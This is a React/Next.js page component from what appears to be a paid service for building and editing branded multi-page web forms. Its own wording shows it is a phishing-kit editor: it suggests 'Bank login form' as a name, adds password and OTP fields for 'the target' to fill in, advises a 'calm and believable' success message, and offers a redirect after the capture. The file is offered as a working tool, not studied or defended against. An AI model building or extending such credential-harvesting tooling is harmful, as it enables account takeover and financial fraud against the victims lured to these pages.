'use client';

import { useParams, useRouter } from 'next/navigation';
import { useEffect, useState } from 'react';
import { toast } from 'react-hot-toast';
import { format } from 'date-fns';
import {
  PlusIcon,
  TrashIcon,
  ChevronUpIcon,
  ChevronDownIcon,
  EyeIcon,
  XMarkIcon,
  ClipboardDocumentIcon,
  CalendarDaysIcon,
} from '@heroicons/react/24/outline';
import { CheckCircleIcon as CheckSolid } from '@heroicons/react/24/solid';
import ImageUpload from '@/components/ImageUpload';

type InputType = 'text' | 'email' | 'password' | 'tel' | 'number' | 'otp';

interface PageInput {
  label: string;
  placeholder: string;
  type: InputType;
  required: boolean;
}

interface CustomPage {
  pageNumber: number;
  title: string;
  subtitle: string;
  writeup: string;
  logoUrl: string;
  backgroundUrl: string;
  backgroundColor: string;
  textColor: string;
  buttonText: string;
  buttonColor: string;
  buttonTextColor: string;
  inputBackgroundColor: string;
  inputTextColor: string;
  inputs: PageInput[];
}

interface SuccessPage {
  title: string;
  message: string;
  buttonText: string;
  buttonUrl: string;
}

interface ScratchLink {
  _id: string;
  linkId: string;
  linkName: string;
  linkType: string;
  expiresAt: string;
  customPages: CustomPage[];
  successPage: SuccessPage;
}

const INPUT_TYPES: { value: InputType; label: string; description: string }[] = [
  { value: 'text',     label: 'Text',     description: 'Any text input' },
  { value: 'email',    label: 'Email',    description: 'Email address' },
  { value: 'password', label: 'Password', description: 'Hidden password field' },
  { value: 'tel',      label: 'Phone',    description: 'Phone number' },
  { value: 'number',   label: 'Number',   description: 'Numbers only' },
  { value: 'otp',      label: 'OTP Code', description: 'Verification code' },
];

const DURATION_OPTIONS = [
  { value: 1, label: '1 Week' },
  { value: 2, label: '2 Weeks' },
  { value: 4, label: '1 Month' },
  { value: 8, label: '2 Months' },
  { value: 12, label: '3 Months' },
];

const MAX_PAGES = 5;
const PRICE_PER_WEEK = 4000;

function SectionHeader({ children }: { children: React.ReactNode }) {
  return (
    <p className="text-xs font-semibold uppercase tracking-widest text-gray-400 dark:text-gray-500 mb-3">
      {children}
    </p>
  );
}

function HelperText({ children }: { children: React.ReactNode }) {
  return <p className="text-xs text-gray-500 dark:text-gray-400 mt-1 leading-relaxed">{children}</p>;
}

function ColorRow({
  label, value, onChange, allowTransparent,
}: {
  label: string; value: string; onChange: (v: string) => void; allowTransparent?: boolean;
}) {
  const isTransparent = value === 'transparent';
  return (
    <div>
      <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-1">{label}</label>
      <div className="flex gap-2 items-center">
        <input type="color" disabled={isTransparent}
          value={isTransparent ? '#ffffff' : value}
          onChange={e => onChange(e.target.value)}
          className="w-10 h-9 rounded cursor-pointer border border-gray-200 dark:border-gray-700 disabled:opacity-40" />
        <input type="text" disabled={isTransparent}
          value={isTransparent ? '' : value}
          onChange={e => onChange(e.target.value)}
          className="flex-1 min-w-0 px-3 py-2 text-xs bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-primary-500/40 disabled:opacity-40"
          placeholder="#hex" />
        {allowTransparent && (
          <button type="button"
            onClick={() => onChange(isTransparent ? '#ffffff' : 'transparent')}
            className={`shrink-0 px-2.5 py-1.5 rounded-lg text-xs font-medium border transition-colors ${
              isTransparent
                ? 'bg-primary-500 border-primary-500 text-white'
                : 'bg-white dark:bg-gray-800 border-gray-200 dark:border-gray-700 text-gray-600 dark:text-gray-400'
            }`}>
            None
          </button>
        )}
      </div>
    </div>
  );
}

export default function ScratchLinkDetails() {
  const params = useParams();
  const router = useRouter();

  const [link, setLink]             = useState<ScratchLink | null>(null);
  const [isLoading, setIsLoading]   = useState(false);
  const [isFetching, setIsFetching] = useState(true);
  const [duration, setDuration]     = useState(1);
  const [activePageIndex, setActivePageIndex] = useState(0);
  const [showPreview, setShowPreview]         = useState(false);
  const [copied, setCopied]                   = useState(false);

  const [customPages, setCustomPages] = useState<CustomPage[]>([]);
  const [successPage, setSuccessPage] = useState<SuccessPage>({
    title: 'Success!', message: 'Your submission has been received.', buttonText: 'Done', buttonUrl: '',
  });
  const [linkName, setLinkName] = useState('');

  const host = process.env.NEXT_PUBLIC_SOCIAL_LINK_HOST?.trim() ?? '';
  const linkUrl = link ? `${host}/slink/${link.linkId}` : '';

  useEffect(() => { fetchLinkDetails(); }, [params.id]);

  const fetchLinkDetails = async () => {
    setIsFetching(true);
    try {
      const res  = await fetch(`/api/auth/links/${params.id}`);
      if (!res.ok) throw new Error();
      const data = await res.json();

      if (data.linkType !== 'scratch') {
        router.replace(`/links/${params.id}`);
        return;
      }

      setLink(data);
      setLinkName(data.linkName || '');
      setCustomPages(data.customPages || []);
      setSuccessPage(data.successPage || {
        title: 'Success!', message: 'Your submission has been received.', buttonText: 'Done', buttonUrl: '',
      });
    } catch {
      toast.error('Error fetching link details');
    } finally {
      setIsFetching(false);
    }
  };

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(linkUrl);
      setCopied(true);
      toast.success('Link copied!');
      setTimeout(() => setCopied(false), 2000);
    } catch { toast.error('Failed to copy'); }
  };

  const activePage = customPages[activePageIndex];

  const updatePage = (idx: number, updates: Partial<CustomPage>) => {
    setCustomPages(prev => prev.map((p, i) => i === idx ? { ...p, ...updates } : p));
  };

  const addPage = () => {
    if (customPages.length >= MAX_PAGES) { toast.error(`Max ${MAX_PAGES} pages`); return; }
    const newPage: CustomPage = {
      pageNumber: customPages.length + 1, title: '', subtitle: '', writeup: '',
      logoUrl: '', backgroundUrl: '', backgroundColor: '#ffffff', textColor: '#111827',
      buttonText: 'Continue', buttonColor: '#3b82f6', buttonTextColor: '#ffffff',
      inputBackgroundColor: 'transparent', inputTextColor: '#000000', inputs: [],
    };
    setCustomPages(prev => [...prev, newPage]);
    setActivePageIndex(customPages.length);
  };

  const removePage = (idx: number) => {
    if (customPages.length <= 1) { toast.error('Need at least one page'); return; }
    setCustomPages(prev => prev.filter((_, i) => i !== idx).map((p, i) => ({ ...p, pageNumber: i + 1 })));
    if (activePageIndex >= customPages.length - 1) setActivePageIndex(Math.max(0, activePageIndex - 1));
  };

  const movePage = (idx: number, dir: 'up' | 'down') => {
    const newIdx = dir === 'up' ? idx - 1 : idx + 1;
    if (newIdx < 0 || newIdx >= customPages.length) return;
    setCustomPages(prev => {
      const pages = [...prev];
      [pages[idx], pages[newIdx]] = [pages[newIdx], pages[idx]];
      return pages.map((p, i) => ({ ...p, pageNumber: i + 1 }));
    });
    setActivePageIndex(newIdx);
  };

  const addInput = (idx: number) => {
    updatePage(idx, { inputs: [...customPages[idx].inputs, { label: '', placeholder: '', type: 'text', required: true }] });
  };

  const removeInput = (pIdx: number, iIdx: number) => {
    updatePage(pIdx, { inputs: customPages[pIdx].inputs.filter((_, i) => i !== iIdx) });
  };

  const updateInput = (pIdx: number, iIdx: number, updates: Partial<PageInput>) => {
    updatePage(pIdx, { inputs: customPages[pIdx].inputs.map((inp, i) => i === iIdx ? { ...inp, ...updates } : inp) });
  };

  const validateForm = (): boolean => {
    if (!linkName.trim()) { toast.error('Link name is required'); return false; }
    for (let i = 0; i < customPages.length; i++) {
      const page = customPages[i];
      if (!page.title.trim()) { toast.error(`Page ${i + 1}: Title is required`); setActivePageIndex(i); return false; }
      if (!page.buttonText.trim()) { toast.error(`Page ${i + 1}: Button text is required`); setActivePageIndex(i); return false; }
      for (let j = 0; j < page.inputs.length; j++) {
        if (!page.inputs[j].label.trim()) { toast.error(`Page ${i + 1}, Input ${j + 1}: Label required`); setActivePageIndex(i); return false; }
      }
    }
    return true;
  };

  const handleUpdate = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateForm()) return;
    setIsLoading(true);
    try {
      const res  = await fetch(`/api/auth/links/${params.id}/scratch`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ linkName, customPages, successPage }),
      });
      const data = await res.json();
      if (!res.ok) { toast.error(data.error || 'Error updating link'); return; }
      toast.success('Link updated successfully');
      fetchLinkDetails();
    } catch { toast.error('Error updating link'); }
    finally { setIsLoading(false); }
  };

  const handleExtend = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    try {
      const res  = await fetch(`/api/auth/links/${params.id}/extend`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ duration }),
      });
      const data = await res.json();
      if (!res.ok) { toast.error(data.error || 'Error extending link'); return; }
      toast.success('Link extended successfully');
      fetchLinkDetails();
    } catch { toast.error('Error extending link'); }
    finally { setIsLoading(false); }
  };

  const handleDelete = async () => {
    if (!confirm('Delete this link permanently?')) return;
    setIsLoading(true);
    try {
      const res = await fetch(`/api/auth/links/${params.id}`, { method: 'DELETE' });
      if (!res.ok) throw new Error();
      toast.success('Link deleted');
      router.push('/links');
    } catch { toast.error('Error deleting link'); }
    finally { setIsLoading(false); }
  };

  const pillCls = (active: boolean) =>
    `px-4 py-2 rounded-full text-sm font-semibold transition-colors duration-150 ${
      active ? 'bg-primary-500 text-white' : 'bg-gray-100 dark:bg-gray-800 text-gray-600 dark:text-gray-400 hover:bg-gray-200 dark:hover:bg-gray-700'
    }`;

  const inputCls = 'w-full px-3.5 py-2.5 bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg text-sm text-gray-900 dark:text-white placeholder:text-gray-400 focus:outline-none focus:ring-2 focus:ring-primary-500/40 focus:border-primary-500 transition-all duration-150';

  const isExpired = link?.expiresAt ? new Date(link.expiresAt) < new Date() : false;

  if (isFetching) {
    return (
      <div className="flex justify-center items-center min-h-[60vh]">
        <div className="w-10 h-10 border-4 border-primary-500/20 border-t-primary-500 rounded-full animate-spin" />
      </div>
    );
  }
  if (!link) return <div className="p-4 text-center text-gray-400">Link not found</div>;

  return (
    <div className="max-w-2xl mx-auto px-4 py-6 space-y-8">

      {/* Header */}
      <div className="flex items-start justify-between gap-3">
        <div>
          <h1 className="text-xl font-bold text-gray-900 dark:text-white">{linkName || 'Edit Custom Link'}</h1>
          <p className="text-xs text-gray-500 dark:text-gray-400 mt-0.5">
            Build from Scratch
            {link.expiresAt && (
              <> · <span className={isExpired ? 'text-red-500' : ''}>
                {isExpired ? 'Expired' : `Expires ${format(new Date(link.expiresAt), 'MMM d, yyyy')}`}
              </span></>
            )}
          </p>
        </div>
        <button type="button" onClick={() => setShowPreview(true)}
          className="shrink-0 flex items-center gap-1.5 px-3 py-2 bg-gray-100 dark:bg-gray-800 text-gray-700 dark:text-gray-300 text-sm font-medium rounded-xl hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors">
          <EyeIcon className="w-4 h-4" />Preview
        </button>
      </div>

      {/* Link URL */}
      <div className="flex items-center gap-2 bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-xl px-4 py-3">
        <span className="text-xs text-gray-500 dark:text-gray-400 font-mono truncate flex-1">{linkUrl}</span>
        <button type="button" onClick={handleCopy}
          className={`shrink-0 flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${
            copied ? 'bg-green-500 text-white' : 'bg-primary-500 hover:bg-primary-600 text-white'
          }`}>
          {copied ? <><CheckSolid className="w-3.5 h-3.5" />Copied!</> : <><ClipboardDocumentIcon className="w-3.5 h-3.5" />Copy</>}
        </button>
      </div>

      {/* ── Extend ── */}
      <section>
        <SectionHeader>Extend duration</SectionHeader>
        <form onSubmit={handleExtend} className="border border-gray-200 dark:border-gray-700 rounded-xl p-4 space-y-4 bg-white dark:bg-gray-900">
          {link.expiresAt && (
            <div className={`flex items-center gap-2 text-xs px-3 py-2 rounded-lg ${isExpired ? 'bg-red-50 dark:bg-red-500/10 text-red-600 dark:text-red-400' : 'bg-gray-50 dark:bg-gray-800 text-gray-500 dark:text-gray-400'}`}>
              <CalendarDaysIcon className="w-4 h-4 shrink-0" />
              {isExpired ? 'Expired — extend to reactivate' : `Currently expires ${format(new Date(link.expiresAt), 'MMM d, yyyy')}`}
            </div>
          )}
          <div className="flex flex-wrap gap-2">
            {DURATION_OPTIONS.map(opt => (
              <button key={opt.value} type="button" onClick={() => setDuration(opt.value)}
                className={pillCls(duration === opt.value)}>{opt.label}</button>
            ))}
          </div>
          <div className="flex items-center justify-between bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-xl px-4 py-3">
            <p className="text-sm font-medium text-gray-700 dark:text-gray-300">Extension cost</p>
            <span className="text-lg font-bold text-primary-500">₦{(duration * PRICE_PER_WEEK).toLocaleString()}</span>
          </div>
          <button type="submit" disabled={isLoading}
            className="w-full py-2.5 rounded-xl text-sm font-semibold text-white bg-primary-500 hover:bg-primary-600 transition-colors disabled:opacity-40">
            {isLoading ? 'Extending…' : 'Extend'}
          </button>
        </form>
      </section>

      {/* ── Edit form ── */}
      <form onSubmit={handleUpdate} className="space-y-8">

        {/* Reference name */}
        <section>
          <SectionHeader>Reference name</SectionHeader>
          <input type="text" value={linkName} onChange={e => setLinkName(e.target.value)}
            className={inputCls} placeholder="e.g. Bank login form" maxLength={50} />
          <HelperText>Only you see this — used to identify the link in your dashboard.</HelperText>
        </section>

        {/* Pages editor */}
        <section className="space-y-4">
          <div className="flex items-center justify-between">
            <SectionHeader>Pages ({customPages.length}/{MAX_PAGES})</SectionHeader>
            <button type="button" onClick={addPage} disabled={customPages.length >= MAX_PAGES}
              className="flex items-center gap-1.5 px-3 py-1.5 bg-primary-500 hover:bg-primary-600 text-white text-xs font-semibold rounded-lg transition-colors disabled:opacity-40">
              <PlusIcon className="w-3.5 h-3.5" />Add Page
            </button>
          </div>

          {/* Page tabs */}
          <div className="flex flex-wrap gap-2">
            {customPages.map((page, index) => (
              <button key={index} type="button" onClick={() => setActivePageIndex(index)}
                className={`px-4 py-2 rounded-lg text-sm font-semibold transition-colors ${
                  activePageIndex === index
                    ? 'bg-primary-500 text-white'
                    : 'bg-gray-100 dark:bg-gray-800 text-gray-600 dark:text-gray-400 hover:bg-gray-200 dark:hover:bg-gray-700'
                }`}>
                {page.title.trim() ? page.title.slice(0, 18) + (page.title.length > 18 ? '…' : '') : `Page ${index + 1}`}
              </button>
            ))}
          </div>

          {activePage && (
            <div className="border border-gray-200 dark:border-gray-700 rounded-xl overflow-hidden">
              {/* Toolbar */}
              <div className="flex items-center gap-1.5 px-3 py-2.5 bg-gray-50 dark:bg-gray-800 border-b border-gray-200 dark:border-gray-700">
                <span className="text-xs font-medium text-gray-500 dark:text-gray-400 mr-auto">
                  Page {activePageIndex + 1} of {customPages.length}
                </span>
                <button type="button" onClick={() => movePage(activePageIndex, 'up')} disabled={activePageIndex === 0}
                  title="Move earlier" className="p-1.5 rounded-lg text-gray-500 hover:bg-gray-200 dark:hover:bg-gray-700 disabled:opacity-30 transition-colors">
                  <ChevronUpIcon className="w-4 h-4" />
                </button>
                <button type="button" onClick={() => movePage(activePageIndex, 'down')} disabled={activePageIndex === customPages.length - 1}
                  title="Move later" className="p-1.5 rounded-lg text-gray-500 hover:bg-gray-200 dark:hover:bg-gray-700 disabled:opacity-30 transition-colors">
                  <ChevronDownIcon className="w-4 h-4" />
                </button>
                <button type="button" onClick={() => removePage(activePageIndex)} disabled={customPages.length <= 1}
                  title="Delete page" className="p-1.5 rounded-lg text-red-400 hover:bg-red-50 dark:hover:bg-red-500/10 disabled:opacity-30 transition-colors">
                  <TrashIcon className="w-4 h-4" />
                </button>
              </div>

              <div className="p-4 space-y-4 bg-white dark:bg-gray-900">
                {/* Title + subtitle */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                      Page title <span className="text-red-400">*</span>
                    </label>
                    <input type="text" value={activePage.title}
                      onChange={e => updatePage(activePageIndex, { title: e.target.value })}
                      className={inputCls} placeholder="e.g. Login to continue" />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                      Subtitle <span className="text-gray-400 font-normal text-xs">(optional)</span>
                    </label>
                    <input type="text" value={activePage.subtitle}
                      onChange={e => updatePage(activePageIndex, { subtitle: e.target.value })}
                      className={inputCls} placeholder="e.g. Enter your credentials" />
                  </div>
                </div>

                {/* Description */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                    Description <span className="text-gray-400 font-normal text-xs">(optional)</span>
                  </label>
                  <textarea value={activePage.writeup} rows={2}
                    onChange={e => updatePage(activePageIndex, { writeup: e.target.value })}
                    className={inputCls} placeholder="Additional text shown above the form fields." />
                </div>

                {/* Images */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  <ImageUpload label="Logo (optional)" value={activePage.logoUrl}
                    onChange={url => updatePage(activePageIndex, { logoUrl: url })}
                    hint="Small brand image shown at the top." />
                  <ImageUpload label="Background image (optional)" value={activePage.backgroundUrl}
                    onChange={url => updatePage(activePageIndex, { backgroundUrl: url })}
                    hint="Full-page background image." />
                </div>

                {/* Button text */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                    Button text <span className="text-red-400">*</span>
                  </label>
                  <input type="text" value={activePage.buttonText}
                    onChange={e => updatePage(activePageIndex, { buttonText: e.target.value })}
                    className={inputCls} placeholder="e.g. Continue, Submit, Next" />
                </div>

                {/* Input fields */}
                <div className="border-t border-gray-100 dark:border-gray-800 pt-4">
                  <div className="flex items-center justify-between mb-3">
                    <div>
                      <p className="text-sm font-semibold text-gray-800 dark:text-white">Input fields</p>
                      <p className="text-xs text-gray-500 dark:text-gray-400">What you want the target to type in.</p>
                    </div>
                    <button type="button" onClick={() => addInput(activePageIndex)}
                      className="flex items-center gap-1.5 px-3 py-1.5 bg-gray-100 dark:bg-gray-800 text-gray-700 dark:text-gray-300 text-xs font-semibold rounded-lg hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors">
                      <PlusIcon className="w-3.5 h-3.5" />Add field
                    </button>
                  </div>

                  {activePage.inputs.length === 0 && (
                    <div className="text-center py-6 border border-dashed border-gray-200 dark:border-gray-700 rounded-xl">
                      <p className="text-sm text-gray-500 dark:text-gray-400">No fields yet.</p>
                      <p className="text-xs text-gray-400 dark:text-gray-500 mt-1">Click "Add field" to add a password box, email field, etc.</p>
                    </div>
                  )}

                  <div className="space-y-3">
                    {activePage.inputs.map((input, iIdx) => (
                      <div key={iIdx} className="bg-gray-50 dark:bg-gray-800 rounded-xl p-3.5 space-y-3">
                        <div className="flex items-center justify-between">
                          <span className="text-xs font-semibold text-gray-500 dark:text-gray-400 uppercase tracking-wide">Field {iIdx + 1}</span>
                          <button type="button" onClick={() => removeInput(activePageIndex, iIdx)}
                            className="p-1 text-red-400 hover:text-red-500 transition-colors">
                            <TrashIcon className="w-4 h-4" />
                          </button>
                        </div>
                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
                          <div>
                            <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-1">Label <span className="text-red-400">*</span></label>
                            <input type="text" value={input.label}
                              onChange={e => updateInput(activePageIndex, iIdx, { label: e.target.value })}
                              className={inputCls} placeholder="e.g. Password" />
                          </div>
                          <div>
                            <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-1">Placeholder hint</label>
                            <input type="text" value={input.placeholder}
                              onChange={e => updateInput(activePageIndex, iIdx, { placeholder: e.target.value })}
                              className={inputCls} placeholder="e.g. Enter your password" />
                          </div>
                        </div>
                        <div>
                          <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-1.5">Field type</label>
                          <div className="flex flex-wrap gap-1.5">
                            {INPUT_TYPES.map(t => (
                              <button key={t.value} type="button" title={t.description}
                                onClick={() => updateInput(activePageIndex, iIdx, { type: t.value })}
                                className={`px-2.5 py-1 rounded-lg text-xs font-semibold transition-colors ${
                                  input.type === t.value
                                    ? 'bg-primary-500 text-white'
                                    : 'bg-white dark:bg-gray-700 border border-gray-200 dark:border-gray-600 text-gray-600 dark:text-gray-400 hover:border-primary-400'
                                }`}>{t.label}</button>
                            ))}
                          </div>
                          <HelperText>{INPUT_TYPES.find(t => t.value === input.type)?.description}.</HelperText>
                        </div>
                        <label className="flex items-center gap-2 cursor-pointer w-fit">
                          <input type="checkbox" checked={input.required}
                            onChange={e => updateInput(activePageIndex, iIdx, { required: e.target.checked })}
                            className="w-4 h-4 rounded border-gray-300 text-primary-500 focus:ring-primary-500" />
                          <span className="text-xs font-medium text-gray-600 dark:text-gray-400">Required field</span>
                        </label>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Appearance */}
                <div className="border-t border-gray-100 dark:border-gray-800 pt-4">
                  <p className="text-sm font-semibold text-gray-700 dark:text-gray-300 mb-1">Customise appearance</p>
                  <p className="text-xs text-gray-500 dark:text-gray-400 mb-3">Colours for background, text, and buttons on this page.</p>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    <ColorRow label="Background colour" value={activePage.backgroundColor || '#ffffff'}
                      onChange={v => updatePage(activePageIndex, { backgroundColor: v })} allowTransparent />
                    <ColorRow label="Text colour" value={activePage.textColor || '#111827'}
                      onChange={v => updatePage(activePageIndex, { textColor: v })} />
                    <ColorRow label="Button colour" value={activePage.buttonColor || '#3b82f6'}
                      onChange={v => updatePage(activePageIndex, { buttonColor: v })} />
                    <ColorRow label="Button text colour" value={activePage.buttonTextColor || '#ffffff'}
                      onChange={v => updatePage(activePageIndex, { buttonTextColor: v })} />
                    <ColorRow label="Input background colour" value={activePage.inputBackgroundColor || 'transparent'}
                      onChange={v => updatePage(activePageIndex, { inputBackgroundColor: v })} allowTransparent />
                    <ColorRow label="Input text colour" value={activePage.inputTextColor || '#000000'}
                      onChange={v => updatePage(activePageIndex, { inputTextColor: v })} />
                  </div>
                </div>
              </div>
            </div>
          )}
        </section>

        {/* Success page */}
        <section className="space-y-4">
          <SectionHeader>What happens after the last page?</SectionHeader>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
            <div>
              <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Heading</label>
              <input type="text" value={successPage.title}
                onChange={e => setSuccessPage(p => ({ ...p, title: e.target.value }))}
                className={inputCls} placeholder="Success!" />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Button text</label>
              <input type="text" value={successPage.buttonText}
                onChange={e => setSuccessPage(p => ({ ...p, buttonText: e.target.value }))}
                className={inputCls} placeholder="Done" />
            </div>
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Message</label>
            <textarea value={successPage.message} rows={2}
              onChange={e => setSuccessPage(p => ({ ...p, message: e.target.value }))}
              className={inputCls} placeholder="Your submission has been received." />
            <HelperText>Shown below the heading. Keep it calm and believable.</HelperText>
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
              Redirect URL <span className="text-gray-400 font-normal text-xs">(optional)</span>
            </label>
            <input type="text" value={successPage.buttonUrl}
              onChange={e => setSuccessPage(p => ({ ...p, buttonUrl: e.target.value }))}
              className={inputCls} placeholder="https://example.com" />
            <HelperText>If set, the button sends the target here. Leave empty to keep them on the success page.</HelperText>
          </div>
        </section>

        {/* Save */}
        <button type="submit" disabled={isLoading}
          className="w-full py-3 rounded-xl font-semibold text-white bg-primary-500 hover:bg-primary-600 transition-colors disabled:opacity-40 flex items-center justify-center gap-2">
          {isLoading ? (
            <><svg className="animate-spin h-5 w-5" viewBox="0 0 24 24">
              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none"/>
              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"/>
            </svg>Saving…</>
          ) : 'Save Changes'}
        </button>
      </form>

      {/* Danger zone */}
      <section className="border border-red-200 dark:border-red-900/50 rounded-xl p-4 bg-red-50 dark:bg-red-500/5">
        <p className="text-sm font-semibold text-red-600 dark:text-red-400 mb-1">Delete this link</p>
        <p className="text-xs text-red-500/80 dark:text-red-400/70 mb-3">This is permanent and cannot be undone.</p>
        <button onClick={handleDelete} disabled={isLoading}
          className="w-full py-2.5 rounded-xl text-sm font-semibold text-white bg-red-600 hover:bg-red-700 transition-colors disabled:opacity-40">
          {isLoading ? 'Deleting…' : 'Delete Link'}
        </button>
      </section>

      {/* ── Preview modal ── */}
      {showPreview && activePage && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70">
          <div className="relative w-full max-w-sm">
            <div className="flex items-center justify-between mb-3">
              <span className="text-white text-sm font-medium">
                Preview — {activePage.title || `Page ${activePageIndex + 1}`}
              </span>
              <button onClick={() => setShowPreview(false)} className="text-white hover:text-gray-300">
                <XMarkIcon className="w-5 h-5" />
              </button>
            </div>
            <div className="relative rounded-2xl overflow-hidden shadow-2xl"
              style={{ backgroundColor: activePage.backgroundColor === 'transparent' ? '#ffffff' : (activePage.backgroundColor || '#ffffff') }}>
              {activePage.backgroundUrl && (
                <div className="absolute inset-0 bg-cover bg-center opacity-20"
                  style={{ backgroundImage: `url(${activePage.backgroundUrl})` }} />
              )}
              <div className="relative p-6">
                {activePage.logoUrl && (
                  // eslint-disable-next-line @next/next/no-img-element
                  <img src={activePage.logoUrl} alt="Logo"
                    className="h-10 mx-auto mb-5 object-contain"
                    onError={e => { e.currentTarget.style.display = 'none'; }} />
                )}
                <h2 className="text-lg font-bold text-center mb-1" style={{ color: activePage.textColor || '#111827' }}>
                  {activePage.title || 'Page Title'}
                </h2>
                {activePage.subtitle && (
                  <p className="text-sm text-center mb-3" style={{ color: activePage.textColor || '#111827', opacity: 0.7 }}>
                    {activePage.subtitle}
                  </p>
                )}
                {activePage.writeup && (
                  <p className="text-xs mb-4" style={{ color: activePage.textColor || '#111827', opacity: 0.7 }}>
                    {activePage.writeup}
                  </p>
                )}
                <div className="space-y-3">
                  {activePage.inputs.map((inp, idx) => (
                    <div key={idx}>
                      <label className="block text-xs font-medium mb-1" style={{ color: activePage.textColor || '#111827' }}>
                        {inp.label || 'Field label'}{inp.required && <span className="text-red-500 ml-1">*</span>}
                      </label>
                      <input type={inp.type === 'otp' ? 'text' : inp.type}
                        placeholder={inp.placeholder} disabled
                        className="w-full px-3 py-2.5 rounded-lg text-sm"
                        style={{
                          backgroundColor: activePage.inputBackgroundColor === 'transparent' ? 'transparent' : (activePage.inputBackgroundColor || 'transparent'),
                          color: activePage.inputTextColor || '#000000',
                          border: '1px solid #d1d5db',
                        }} />
                    </div>
                  ))}
                </div>
                <button className="w-full mt-5 py-2.5 rounded-lg text-sm font-semibold" disabled
                  style={{ backgroundColor: activePage.buttonColor || '#3b82f6', color: activePage.buttonTextColor || '#ffffff' }}>
                  {activePage.buttonText || 'Continue'}
                </button>
              </div>
            </div>
            {customPages.length > 1 && (
              <div className="flex justify-center gap-2 mt-3">
                {customPages.map((_, i) => (
                  <button key={i} onClick={() => setActivePageIndex(i)}
                    className={`w-2 h-2 rounded-full transition-colors ${i === activePageIndex ? 'bg-white' : 'bg-white/40'}`} />
                ))}
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
